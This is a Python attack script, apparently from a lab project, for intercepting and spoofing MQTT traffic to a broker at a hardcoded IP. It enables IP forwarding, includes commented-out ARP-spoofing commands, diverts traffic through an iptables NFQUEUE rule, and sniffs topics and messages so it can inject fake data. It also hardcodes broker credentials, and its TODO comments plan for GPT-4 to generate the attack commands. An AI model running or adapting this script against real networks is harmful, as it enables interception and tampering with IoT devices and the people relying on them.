import os
from urllib import response
import openai 
import threading
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import *
import struct
import subprocess
import signal
import time
from netfilterqueue import NetfilterQueue
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"
targetIP = "192.168.8.210"
attackerIP = "192.168.1.16"
message = ""
sniffed_topic = ""
sniffed_message = ""
desired_payload = None
stop_flag = False
mqtt_topic = ""
# Set the username and password
username = "smartmqtt"  # replace with your username
password = "HokieDVE"  # replace with your password
broker_ip = "192.168.8.210"
topic = "test/topic"
rec = False

def on_connect(client, userdata, flags, rc):
    print("connected to MQTT Broker")    
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        return None, None

def process_packet(packet):
    global sniffed_topic, sniffed_message
    print("Yuh")
    if packet.haslayer(TCP) and packet.haslayer(IP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport
        # Check if this is MQTT traffic between the two VMs
        print("Im in")
        if (tcp_sport == 1883 or tcp_dport == 1883):
            # Attempt to parse MQTT payload
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
            print("conversation detected")
            if topic and message:
                print(f"MQTT Packet from {ip_src} to {ip_dst}\nTopic: {topic}\nMessage: {message}")
                sniffed_message = message
                sniffed_topic = topic
def fake_data_transfer_attack():
    global targetIP, client, desired_payload, stop_flag
    #Performs packet sniffing to discover topic and message:
    #TODO allow for multiple topics to be found. Then have AI determine which topic would be appropriate for attacking.
    print("Performing Fake Data Transfer...")
    print("Sniffing Packets...")
    #sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 5)
    #print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
    
    try:
        """
        while desired_payload is None:
            '''
            os.system("sudo iptables -A INPUT -j NFQUEUE --queue-num 0")
            nfqueue = NetfilterQueue()
            nfqueue.bind(0, generate_fake_payload)
            nfqueue.run()
            nfqueue.unbind()
            os.system("sudo iptables -D INPUT -j NFQUEUE --queue-num 0")
            '''
            thread = threading.Thread(target=publish_fake_message)
            thread.start()
            sniff(prn=generate_fake_payload, filter="tcp port 1883", store=False, timeout= 3)
        
        print(desired_payload)
        stop_flag = True
        """
        #Enables ip forwarding (hence passing on the packets we get)
        #TODO: Have AI generate this command
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        
        #Reroutes the packets from the gateway router through this computer.
        #TODO: Have AI generate this command. But you must have this program run in parrallel.
        #routerAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.1", targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #time.sleep(3)
        #Reroutes packets from the MQTT server through this computer.
        #TODO: Have AI generate this command. But you must have this program run in parrallel.
        #nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, "192.168.1.1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #time.sleep(3)
        
        #Enables nfqueue
        command = f"sudo iptables -A FORWARD -d {targetIP} -j NFQUEUE --queue-num 1"
        
        os.system(command)
        nfqueue = NetfilterQueue()
        print("AFTER")
        nfqueue.bind(1, process_packet)
        print("OK")
        nfqueue.run()
        print("YEAH")
        # Set the callback function for intercepted packets
        while True:
            time.sleep(5)
            #client.publish(sniffed_topic, "Hacked")
            pass
    except KeyboardInterrupt:
        print("Stopping sniffing")
        #os.kill(nodeAttack.pid, signal.SIGTERM)
        #os.kill(routerAttack.pid, signal.SIGTERM)
        command = f"sudo iptables -D FORWARD -d {targetIP} -j NFQUEUE --queue-num 1"
        os.system(command)
        # Clean up when the user interrupts the script
        nfqueue.unbind()
# Create an MQTT client instance
client = mqtt.Client()


client.username_pw_set(username, password)

# Assign the callback functions
client.on_connect = on_connect
client.on_message = on_message

# Connect to the broker
client.connect("192.168.8.210", 1883)
#TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).
try:
    while True: 
        #lang_classification()
        #if(rec):
        #response = lang_classification()
        json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
        response = json.loads(json_string)
        #execute_attack(response)
        print("connected223")
        fake_data_transfer_attack()
        #rec = False
        #break
except KeyboardInterrupt:
    print("Stopping Attack....")

